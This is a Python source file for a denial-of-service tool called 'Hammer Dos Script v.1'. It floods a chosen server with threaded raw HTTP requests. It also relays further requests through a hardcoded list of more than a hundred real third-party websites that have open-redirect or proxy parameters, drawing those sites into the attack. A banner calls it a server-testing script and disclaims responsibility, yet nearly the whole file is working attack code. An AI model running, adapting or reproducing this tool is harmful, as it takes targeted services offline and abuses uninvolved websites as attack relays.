
#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ Hammer Dos Script v.1
# by Tampansky
from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("https://validator.w3.org/check?uri=")
	bots.append("http://ecvd.org/Security/login?BackURL=")
	bots.append("http://www.vxsport.com/Security/login?BackURL=")
	bots.append("http://www.workchoice.co.nz/Security/login?BackURL=")
	bots.append("http://motatapu.com/Security/login?BackURL=")
	bots.append("http://www.warwickartscentre.co.uk/Security/login?BackURL=")
	bots.append("http://www.chillout.co.nz/Security/login?BackURL=")
	bots.append("http://www.alexandraclub.com.au/Security/login?BackURL=")
	bots.append("http://infotechenterprises.com/Security/login?BackURL=")
	bots.append("http://www.pilatesfoundation.com/Security/login?BackURL=")
	bots.append("http://www.archbishopholgates.org/Security/login?BackURL=")
	bots.append("http://www.centerforirishmusic.org/Security/login?BackURL=")
	bots.append("http://www.radimage.info/Security/login?BackURL=")
	bots.append("http://www.fosterconversation.com/Security/login?BackURL=")
	bots.append("http://www.aquariitech.com/Security/login?BackURL=")
	bots.append("http://www.akentishceremony.com/Security/login?BackURL=")
	bots.append("http://spell-write.nz/Security/login?BackURL=")
	bots.append("http://dacd.win/b.php?b=4&u=")
	bots.append("https://www.technogadgets.com.sg/store/index.php?_a=login&redir=")
	bots.append("http://learningstaircase.co.nz/Security/login?BackURL=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://www.theatreroyal.com/Security/login?BackURL=")
	bots.append("http://www.raca.com.au/Security/login?BackURL=")
	bots.append("http://www.olivefarmwines.com/Security/login/login?BackURL=")
	bots.append("http://www.queensclub.com.au/Security/login?BackURL=")
	bots.append("https://www.cciq.com.au/Security/login?BackURL=")
	bots.append("http://www.bpa.org.uk/Security/login?BackURL=")
	bots.append("http://repcoii.com/Security/login?BackURL=")
	bots.append("https://www.uk-assignments.com/Security/login?BackURL=")
	bots.append("http://www.internal-displacement.org/Security/login?BackURL=")
	bots.append("http://www.genesis-marine.com/Security/login?BackURL=")
	bots.append("https://www.eat.co.nz/Security/login?BackURL=")
	bots.append("http://www.montereycountypops.org/Security/login?BackURL=")
	bots.append("http://www.indiainfoline.com/user/login?backurl=")
	bots.append("http://silverstripe-foundation.com/Security/login?BackURL=")
	bots.append("http://www.siddharthasintent.org/Security/login?BackURL=")
	bots.append("http://gymkengymnastics.com/Security/login?BackURL=")
	bots.append("http://www.odysseywallcoverings.com/Security/login?BackURL=")
	bots.append("http://www.milkeneducatorawards.org/Security/login?BackURL=")
	bots.append("https://www.glenfiddich.com/Security/login?BackURL=")
	bots.append("http://cesa.org/Security/login?BackURL=")
	bots.append("https://www.sustainableplant.com/Security/login?BackURL=")
	bots.append("http://vapesense.co.uk/instamember/?imhandler=login&redir=")
	bots.append("http://www.crcsi.com.au/Security/login?BackURL=")
	bots.append("http://www.nzieh.org.nz/Security/login?BackURL=")
	bots.append("http://www.library.umass.edu/Security/login?BackURL=")
	bots.append("http://www.dombinnov.fr/Security/login?BackURL=")
	bots.append("http://www.nad.org.nz/Security/login?BackURL=")
	bots.append("http://kikuly.sextgem.com/phong-chat/index.php?room=admin&i=49&url=")
	bots.append("http://www.edchipman.ca/Security/login?BackURL=")
	bots.append("http://www.sparkscience.ca/Security/login?BackURL=")
	bots.append("http://www.skylineonline.ca/Security/login?BackURL=")
	bots.append("http://opencompute.org/Security/login?BackURL=")
	bots.append("http://www.kurtztrucking.com/Security/login?BackURL=")
	bots.append("http://www.mckenzieinstitute.org/Security/login?BackURL=")
	bots.append("http://www.koreandramafc.com/out/?goto=")
	bots.append("http://www.ustinova.ru/bitrix/rk.php?goto=")
	bots.append("http://www.bcs-urec.ru/bitrix/rk.php?goto=")
	bots.append("http://www.boyscouttrail.com/external_frame.asp?goto=")
	bots.append("https://www.eoutlet4u.com/index.php?_a=login&redir=")
	bots.append("http://www.mosgu.ru/nauchnaya/bitrix/redirect.php?event1=&event2=&event3=&goto=")
	bots.append("http://www.allgoodnewspaper.com/addons/ad_banners/clickthru.asp?bnrid=10&goto=")
	bots.append("http://autoplanet1.com/redirect?goto=")
	bots.append("http://www.xmarks.com/site/reviews/1/sso.capella.edu/amserver/UI/Login%3Fgoto=")
	bots.append("http://www.fif-orientering.dk/fif/index.asp?goto=")
	bots.append("http://www.infolapas.lv/company/?id=27574&goto=")
	bots.append("http://www.euroinfopage.lv/company/?id=11575&goto=")
	bots.append("http://it.groupeisa.com/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=")
	bots.append("http://jescobedo.com/wp-content/themes/dt-chocolate/like_window.php?img=")
	bots.append("http://latinamerica.brother.com/LeavingOurSite.aspx?GoTo=")
	bots.append("http://www.zanzana.net/goto.asp?goto=")
	bots.append("http://www.isagri.pt/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=")
	bots.append("http://ipdt.pt/?p=login&redir=")
	bots.append("http://www.karimbenamor.com/goto/index.asp?goto=")
	bots.append("http://www.iris.edu/hq/accounting/login?redir=")
	bots.append("http://www.berthoud.com/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=")
	bots.append("http://khalilyassirphotos.com/wp-content/themes/dt-chocolate/like_window.php?img=")
	bots.append("http://loycetranchant.com/wp-content/themes/dt-chocolate/like_window.php?img=")
	bots.append("http://www.isagri.es/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=")
	bots.append("http://www.endtimescoming.com/articles.php?PageURL=")
	bots.append("http://www.tecnor-sofac.fr/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=")
	bots.append("http://berthoud-cn.isagri-ingenierie.fr/BibliRessources/PagesSystem/IFramePage.aspx?keywords=&PageUrl=")
	bots.append("https://survivalservers.com/wiki/index.php?title=File:PageURL.jpg&sa=U&ved=0ahUKEwjI__nTipjKAhUDUZAKHXdwBi4QFgjGATAj&usg=AFQjCNEfWhaWbCWw_W5mCdpnQllizjSlxQpageurl=")
	bots.append("http://www.agylin.fr/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=")
	bots.append("https://laboutiquepuget.fr/login/fwd?redirect_uri=")
	bots.append("http://www.expandis.coop/bibliressources/pagessystem/iframepage.aspx?pageurl=")
	bots.append("http://ja-gp-fukuoka.jp/php/proxy.php?url=&url=")
	bots.append("http://www.ubidoca.com/_en/print.php?pageURL=")
	bots.append("http://www.unisigma.com/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=")
	bots.append("http://www.myappwiz.info/home/redirect?targetUrl=")
	bots.append("http://forms.ncl.ac.uk/view.php?id=2580&PageURL=")
	bots.append("http://www.vueltaachihuahua.com/2009/proxy.php?url=")
	bots.append("http://www3.truecorp.co.th/auth/auth_ssov2/logout?redirect_uri=")
	bots.append("http://cs.joensuu.fi/pages/bednarik/UE2006/rssgenr8.php?pageurl=")
	bots.append("http://www.aktau-business.com/forum/away.php?s=")
	bots.append("http://www.invalirus.ru/forum/away.php?s=")
	bots.append("http://santcom63.ru/forum/away.php?s=")
	bots.append("http://forum.ostereo.ru/away.php?s=")
	bots.append("http://dle.in.ua/talk/away.php?s=")
	bots.append("http://www.1national.ru/away.php?url=")
	bots.append("http://www.php.net/de/control-structures.goto.phpgoto=")
	bots.append("http://minecraft-rus.ru/forum/away.php?s=")
	bots.append("http://gmod-fan.ru/forum/away.php?s=")
	bots.append("http://kindle-fire.in.ua/forum/away.php?s=")
	bots.append("http://opencart.ws/forum/away.php?s=")
	bots.append("http://forum.freesteam.ru/away.php?s=")
	bots.append("http://www.karplaw.com/index.php?go=")
	bots.append("http://www.sansiro.net/?page_id=2748page=")
	bots.append("http://www.veithsymposium.org/index.php?pg=")
	bots.append("http://www.osronline.com/cf.cfm?PageURL=showlists.CFM?list=NTDEVpageurl=")
	bots.append("http://www.sian.it/portale-sian/login?redirectTo=home.jspredirect=")
	bots.append("http://www.budogu.jp/cart/syscheck.cgi?url=")
	bots.append("http://www.mytaxcollector.com/trsearch.aspx?redir=")
	bots.append("http://sfpl.org/index.php?pg=")
	bots.append("http://www2.vcdh.virginia.edu/cem/person-search.php?go=")
	bots.append("http://www.nyandcompany.com/nyco/article/articleTemplate.jsp?pageUrl=/html/catalog/benefits-rewardsClub.html&heading=Benefitspageurl=")
	bots.append("http://support.lexmark.com/index?page=")
	bots.append("http://www.titantv.com/account/login.aspx?returnUrl=/Default.aspxreturn=")
	bots.append("http://mihavxc.ru/go.php?url=")
	bots.append("https://or71.ru/news/detail.php?ID=")
	bots.append("http://forums.9carthai.com/go.php?url=")
	bots.append("http://www.aidsalliance.org.ua/cgi-bin/index.cgi?url=")
	bots.append("http://translate.google.com/translate?u=")
	bots.append("http://www.icdcprague.org/index.php?id=")
	bots.append("http://www.dplogin.com/index.php?action=")
	bots.append("http://yoro49.com/gallery/gallery.php?id=")
	bots.append("http://www.liisma.org/index.php?action=")
	bots.append("http://www.wasagabeachpark.com/index.php?action=")
	bots.append("http://www.jp-rail.com/products.php?type=")
	bots.append("https://www.minzdrav.uz/en/news/detail.php?ID=")

	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mAttacking . . .\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! Attacking . . . \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mserver down . . .\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
		`/ymMMMMMMMMMMMMMMmy/`
       /hMMMMMMMMMMMMMMMMMMMMMMh/
     /mMMmNMMMMMNNNNNNNNMMMMMNNMMm/
   `hNmo:dMMNNNmNNmNNmNNmNNNMMd:omNh`
  .mh:+/hMNNNNmNNmNdhmmNNmNNNNMy/o:hm.
 `d+://sNmMMMmMMMmdy+/mMMMmMMMmNs///+d`
 ys.o/oMmNNNmNNMNNMmdMNNMNNmNNNmMo/o.ys
`my.-/NmMMMMmMMNmNNyyNNmNMMmMMMMmN/:`ym`
-h/+s/MmMMMNmNNNdym++mymNNNmNMMNmM:so/h-
-N.o.sMmMMMNh/:-`-Mo\033[37;1msM-`-:/hNMMMmMs.+.N-
`ho/-ohmMMMM/    -M/+M.    /MMMMmho-/oh
 s+-s-odmNNN`     /-:/     .NNNmd+:s-+s
 `mo/-:+ymMm                mMms+:-/om`
  .h/+/y`hhs                yyh`y/+/h.
   `hd/::-+.                .+-::/dy`
     /hs+/::.--          --.::/+sh:
       :hds+/-`          `-/+sdh:
         `/ymM+          oMmy/
    #Editor Tampansky#
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 hammers.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
	-t : turbo default 135 \033[0m''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mPlease wait . . .\033[0m")
	user_agent()
	my_bots()
	time.sleep(2)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
